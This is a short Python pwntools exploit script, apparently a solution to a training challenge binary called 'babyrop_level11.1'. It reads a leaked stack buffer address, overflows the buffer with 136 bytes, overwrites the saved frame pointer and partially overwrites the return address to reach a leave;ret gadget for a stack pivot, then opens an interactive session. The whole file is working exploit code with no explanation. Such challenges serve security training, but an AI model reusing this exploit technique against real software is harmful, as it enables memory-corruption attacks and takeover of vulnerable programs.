from pwn import *

p = process("./babyrop_level11.1")

context.terminal = ['tmux',"splitw",'-h']

p.recvuntil(b"[LEAK] Your input buffer is located at: ")

leak = int(p.recvline().decode().split('.')[0],16)

log.success(leak)

payload = b"A" * 136 + p64(leak-16) + b'\x09'

#  0x0000000000001b09 <+182>:   leave
#   0x0000000000001b0a <+183>:   ret



p.send(payload)

p.interactive()
